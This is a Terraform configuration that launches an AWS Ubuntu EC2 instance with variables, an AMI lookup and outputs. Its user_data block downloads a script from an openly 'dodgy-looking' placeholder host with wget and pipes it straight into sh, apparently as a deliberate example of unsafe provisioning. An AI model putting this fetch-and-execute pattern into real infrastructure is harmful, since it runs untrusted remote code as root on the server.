terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 3.72"
    }
  }
}

provider "aws" {
  region = "eu-north-1"
  access_key = var.aws_access_key
  secret_key = var.aws_secret_key
}

variable "aws_access_key" {
    description = "AWS Access Key"
    type = string
}

variable "aws_secret_key" {
  description = "AWS Secret Key"
  type = string
}

variable "env" {
  default = "dev"
}

variable "t" {
    default = "t2.micro"
}

data "aws_ami" "ubuntu-web" {
  most_recent = true

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }

  owners = ["099720109477"] # Canonical
}

resource "aws_instance" "test" {
    ami = "${data.aws_ami.ubuntu-web.id}"
    associate_public_ip_address = true
    instance_type               = var.t
    key_name = var.env
    subnet_id = "subnet-01234567890abcdef"

    ebs_block_device {
      delete_on_termination = true
      volume_size           = 10
      volume_type = "gp2"
    }

    user_data = <<EOF
apt update && apt install -y jq wget
wget http://dodgy-looking-website.com/not-version-controlled-untested-shell-script -O – | sh —
EOF
}

output "id" {
  value = aws_instance.test.id
}

output "public_ip" {
  description = "Public IP address of the Instance"
  value = aws_instance.test.public_ip
}
